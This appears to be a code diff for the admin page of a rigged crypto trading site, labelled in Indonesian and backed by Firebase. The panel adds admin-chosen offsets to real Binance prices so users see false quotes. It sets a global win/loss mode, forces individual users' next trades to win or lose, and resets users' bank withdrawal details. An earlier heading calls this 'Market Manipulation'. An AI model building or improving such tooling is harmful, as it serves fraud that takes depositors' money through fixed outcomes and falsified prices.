@@ -3,19 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Master Control Panel | 10 Coins</title>
+    <title>Master Control Panel | 10 Coins Fix</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <script src="config.js"></script>
     <style>
         .gold-text { color: #f3ba2f; }
         .glass-card { background: #0f0f0f; border: 1px solid rgba(255,255,255,0.1); }
-        body { background-color: #050505; color: white; font-family: sans-serif; overflow-x: hidden; }
+        body { background-color: #050505; color: white; font-family: sans-serif; }
         #toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 8px; }
-        .toast { animation: slideIn 0.3s ease forwards; min-width: 200px; }
-        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
-        ::-webkit-scrollbar { width: 5px; }
-        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: #333; }
     </style>
 </head>
 <body class="p-4">
@@ -26,40 +24,36 @@
         
         <div class="glass-card p-4 rounded-3xl flex justify-between items-center border border-yellow-500/20">
             <div class="flex items-center gap-3">
-                <div class="p-2 bg-yellow-500 rounded-lg">
-                    <i data-lucide="shield-check" class="text-black w-5 h-5"></i>
-                </div>
-                <h1 class="text-xs font-black uppercase tracking-tighter">Ultimate Admin Console</h1>
+                <div class="p-2 bg-yellow-500 rounded-lg"><i data-lucide="shield-check" class="text-black w-5 h-5"></i></div>
+                <h1 class="text-xs font-black uppercase tracking-widest">Master Admin <span class="gold-text">v2.0</span></h1>
             </div>
-            <button onclick="window.location.href='managegrafik.html'" class="flex items-center gap-2 px-4 py-2 bg-white/5 border border-white/10 rounded-xl hover:bg-yellow-500/10 transition-all">
-                <span class="text-[10px] font-black uppercase tracking-widest">Halaman Grafik</span>
-                <i data-lucide="chevron-right" class="w-4 h-4 gold-text"></i>
+            <button onclick="window.location.href='managegrafik.html'" class="flex items-center gap-2 px-4 py-2 bg-white/5 border border-white/10 rounded-xl hover:bg-yellow-500/20 transition-all active:scale-95">
+                <span class="text-[10px] font-black uppercase italic">Halaman Grafik</span>
+                <i data-lucide="external-link" class="w-3 h-3 gold-text"></i>
             </button>
         </div>
 
         <div class="glass-card p-5 rounded-3xl border-l-4 border-yellow-500 flex flex-col md:flex-row justify-between items-center gap-4">
-            <div>
-                <h2 class="text-[10px] font-black uppercase text-gray-500 italic">Global System Target</h2>
-                <p class="text-[9px] text-gray-400">Pengaturan ini akan berdampak pada seluruh user secara otomatis</p>
+            <div class="text-center md:text-left">
+                <h2 class="text-[10px] font-black uppercase text-gray-500">Global Target Mode</h2>
+                <p class="text-[9px] text-gray-400 italic">Berlaku untuk semua user yang tidak ditarget manual</p>
             </div>
             <div class="flex gap-2">
-                <button onclick="setGlobal('win')" class="px-4 py-2 bg-green-500/10 border border-green-500/20 text-green-500 rounded-xl text-[10px] font-black hover:bg-green-500/20">GLOBAL WIN</button>
-                <button onclick="setGlobal('normal')" class="px-4 py-2 bg-gray-500/10 border border-gray-500/20 text-gray-400 rounded-xl text-[10px] font-black hover:bg-gray-500/20">NORMAL</button>
-                <button onclick="setGlobal('loss')" class="px-4 py-2 bg-red-500/10 border border-red-500/20 text-red-500 rounded-xl text-[10px] font-black hover:bg-red-500/20">GLOBAL LOSS</button>
+                <button onclick="setGlobal('win')" class="px-4 py-2 bg-green-500/10 border border-green-500/20 text-green-500 rounded-xl text-[10px] font-black">WIN</button>
+                <button onclick="setGlobal('normal')" class="px-4 py-2 bg-gray-500/10 border border-gray-500/20 text-gray-400 rounded-xl text-[10px] font-black">NORMAL</button>
+                <button onclick="setGlobal('loss')" class="px-4 py-2 bg-red-500/10 border border-red-500/20 text-red-500 rounded-xl text-[10px] font-black">LOSS</button>
             </div>
         </div>
 
         <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
             
             <div class="lg:col-span-2 space-y-4">
-                <div class="flex items-center justify-between px-2">
-                    <h2 class="text-[10px] font-black uppercase tracking-widest text-gray-500 flex items-center gap-2 italic">
-                        <i data-lucide="bar-chart-3" class="w-3 h-3 text-yellow-500"></i> Market Manipulation (10 Coins)
-                    </h2>
+                <div class="flex items-center gap-2 px-2">
+                    <i data-lucide="zap" class="w-4 h-4 gold-text"></i>
+                    <h2 class="text-[10px] font-black uppercase tracking-widest text-gray-500 italic">Market Control (10 Coins)</h2>
                 </div>
-                <div id="market-grid" class="grid grid-cols-1 md:grid-cols-2 gap-3 italic">
-                    <p class="text-[10px] text-gray-600 animate-pulse">Memuat data 10 koin...</p>
-                </div>
+                <div id="market-grid" class="grid grid-cols-1 md:grid-cols-2 gap-3">
+                    </div>
             </div>
 
             <div class="space-y-4">
@@ -71,10 +65,9 @@
                         <i data-lucide="refresh-cw" class="w-4 h-4"></i>
                     </button>
                 </div>
-                <div id="user-list" class="space-y-3 max-h-[800px] overflow-y-auto pr-2">
+                <div id="user-list" class="space-y-3 max-h-[600px] overflow-y-auto pr-2">
                     </div>
             </div>
-
         </div>
     </div>
 
@@ -85,7 +78,6 @@
         const app = initializeApp(APP_CONFIG.firebase);
         const db = getFirestore(app);
 
-        // DAFTAR 10 KOIN UTAMA
         const COINS = ['BTCUSDT', 'ETHUSDT', 'BNBUSDT', 'SOLUSDT', 'ADAUSDT', 'XRPUSDT', 'DOTUSDT', 'DOGEUSDT', 'MATICUSDT', 'LINKUSDT'];
         let marketOffsets = {};
         let binancePrices = {};
@@ -93,15 +85,14 @@
         function showNotify(msg, type = 'success') {
             const container = document.getElementById('toast-container');
             const t = document.createElement('div');
-            const color = type === 'success' ? 'bg-green-500 text-black' : (type === 'error' ? 'bg-red-500 text-white' : 'bg-yellow-500 text-black');
-            t.className = `${color} p-4 rounded-2xl shadow-2xl toast flex items-center gap-3 text-[10px] font-black uppercase`;
-            t.innerHTML = `<i data-lucide="bell" class="w-4 h-4"></i> <span>${msg}</span>`;
+            const color = type === 'success' ? 'bg-green-500' : 'bg-red-500';
+            t.className = `${color} text-black p-4 rounded-xl shadow-2xl flex items-center gap-2 text-[10px] font-black uppercase`;
+            t.innerHTML = `<span>${msg}</span>`;
             container.appendChild(t);
-            lucide.createIcons();
             setTimeout(() => t.remove(), 3000);
         }
 
-        // AMBIL HARGA BINANCE SETIAP 2 DETIK
+        // 1. Fungsi Fetch Harga
         async function fetchPrices() {
             try {
                 const r = await fetch('https://api.binance.com/api/v3/ticker/price');
@@ -110,78 +101,70 @@
                     const found = data.find(item => item.symbol === s);
                     if(found) binancePrices[s] = parseFloat(found.price);
                 });
-                renderMarket(); // Re-render agar harga update terus
-            } catch(e) { console.error("Price fetch error"); }
+                renderMarket();
+            } catch(e) { console.log("Fetch error"); }
         }
-        setInterval(fetchPrices, 2000);
 
-        // SYNC OFFSET DARI FIREBASE
+        // 2. Listen Offset Firebase
         onSnapshot(doc(db, "system", "multi_market"), (s) => {
             if(s.exists()) marketOffsets = s.data();
             renderMarket();
         });
 
-        // FUNGSI UTAMA RENDER 10 KARTU KOIN
+        // 3. Render Market (Fixed: Selalu render 10 koin)
         function renderMarket() {
             const container = document.getElementById('market-grid');
             if(!container) return;
-            container.innerHTML = "";
+            
+            let htmlContent = "";
             COINS.forEach(s => {
                 const offset = marketOffsets[s] || 0;
                 const real = binancePrices[s] || 0;
                 const userPrice = real + offset;
-                container.innerHTML += `
-                    <div class="glass-card p-4 rounded-3xl border border-white/5 hover:border-yellow-500/30 transition-all">
+                
+                htmlContent += `
+                    <div class="glass-card p-4 rounded-3xl border border-white/5 hover:border-yellow-500/40 transition-all">
                         <div class="flex justify-between items-start mb-3">
                             <span class="text-[11px] font-black gold-text italic">${s.replace('USDT','')}</span>
                             <div class="text-right">
-                                <p class="text-[8px] text-gray-500 font-bold uppercase">User View</p>
-                                <p class="text-[11px] font-mono font-black">$${userPrice.toLocaleString()}</p>
+                                <p class="text-[8px] text-gray-500 font-bold uppercase">Tampilan User</p>
+                                <p class="text-[11px] font-mono font-black">$${userPrice > 0 ? userPrice.toLocaleString() : '---'}</p>
                             </div>
                         </div>
                         <div class="flex gap-2">
-                            <input type="number" id="off-${s}" value="${offset}" placeholder="Offset" class="bg-black/50 w-full border border-white/10 rounded-xl p-2 text-[10px] font-bold focus:border-yellow-500 outline-none">
-                            <button onclick="saveOffset('${s}')" class="bg-yellow-500 text-black px-4 rounded-xl text-[10px] font-black hover:bg-yellow-400">SET</button>
+                            <input type="number" id="off-${s}" value="${offset}" class="bg-black/50 w-full border border-white/10 rounded-xl p-2 text-[10px] font-bold focus:border-yellow-500 outline-none">
+                            <button onclick="saveOffset('${s}')" class="bg-yellow-500 text-black px-4 rounded-xl text-[10px] font-black">SET</button>
                         </div>
                     </div>`;
             });
+            container.innerHTML = htmlContent;
         }
 
-        // SAVE OFFSET PER KOIN
         window.saveOffset = async (s) => {
             const val = parseFloat(document.getElementById(`off-${s}`).value) || 0;
             marketOffsets[s] = val;
-            try {
-                await setDoc(doc(db, "system", "multi_market"), marketOffsets, { merge: true });
-                showNotify(`${s} Berhasil Diatur!`);
-            } catch(e) { showNotify("Gagal", "error"); }
+            await setDoc(doc(db, "system", "multi_market"), marketOffsets, { merge: true });
+            showNotify(`${s} Berhasil Update!`);
         };
 
-        // GLOBAL MODE
         window.setGlobal = async (mode) => {
             await setDoc(doc(db, "system", "market_control"), { mode: mode }, { merge: true });
-            showNotify("GLOBAL: " + mode.toUpperCase(), 'warning');
+            showNotify("GLOBAL MODE: " + mode.toUpperCase());
         };
 
-        // USER WIN/LOSS
         window.setUserTarget = async (uid, result) => {
             await updateDoc(doc(db, "users", uid), { next_trade: result });
-            showNotify("User lock: " + result.toUpperCase());
+            showNotify("User Locked: " + result);
         };
 
-        // RESET REKENING / WITHDRAW
         window.resetUserBank = async (uid) => {
-            if(confirm("Buka gembok bank dan hapus data withdraw user ini?")){
-                await updateDoc(doc(db, "users", uid), {
-                    is_bank_locked: false,
-                    bank_name: "", bank_number: "", bank_holder: ""
-                });
-                showNotify("Rekening & WD Direset!");
+            if(confirm("Buka gembok rekening user?")){
+                await updateDoc(doc(db, "users", uid), { is_bank_locked: false, bank_name: "", bank_number: "", bank_holder: "" });
+                showNotify("Bank User Direset!");
                 loadUsers();
             }
         };
 
-        // LOAD DAFTAR USER
         window.loadUsers = async () => {
             const snap = await getDocs(collection(db, "users"));
             const container = document.getElementById('user-list');
@@ -189,24 +172,26 @@
             snap.forEach(u => {
                 const d = u.data();
                 container.innerHTML += `
-                    <div class="glass-card p-4 rounded-2xl border border-white/5 space-y-3">
+                    <div class="glass-card p-4 rounded-2xl border border-white/5 space-y-3 italic">
                         <div class="flex justify-between items-center text-[10px]">
-                            <span class="font-bold text-gray-400 truncate w-24 italic">${d.email || 'No Email'}</span>
+                            <span class="font-bold text-gray-400 truncate w-24">${d.email || 'No Email'}</span>
                             <span class="font-black gold-text">Rp${(d.balance || 0).toLocaleString()}</span>
                         </div>
                         <div class="grid grid-cols-3 gap-1">
-                            <button onclick="setUserTarget('${u.id}', 'win')" class="bg-green-600/10 text-green-500 py-2 rounded-lg text-[8px] font-black uppercase">Win</button>
-                            <button onclick="setUserTarget('${u.id}', 'loss')" class="bg-red-600/10 text-red-500 py-2 rounded-lg text-[8px] font-black uppercase">Loss</button>
-                            <button onclick="resetUserBank('${u.id}')" class="bg-white/5 text-yellow-500 border border-yellow-500/10 py-2 rounded-lg text-[8px] font-black uppercase">Reset</button>
+                            <button onclick="setUserTarget('${u.id}', 'win')" class="bg-green-500/10 text-green-500 py-2 rounded-lg text-[8px] font-black uppercase">Win</button>
+                            <button onclick="setUserTarget('${u.id}', 'loss')" class="bg-red-500/10 text-red-500 py-2 rounded-lg text-[8px] font-black uppercase">Loss</button>
+                            <button onclick="resetUserBank('${u.id}')" class="bg-white/5 text-gray-400 py-2 rounded-lg text-[8px] font-black uppercase">Reset</button>
                         </div>
                     </div>`;
             });
             lucide.createIcons();
         };
 
-        lucide.createIcons();
-        loadUsers();
+        // Jalankan awal
         fetchPrices();
+        setInterval(fetchPrices, 3000);
+        loadUsers();
+        lucide.createIcons();
     </script>
 </body>
 </html>
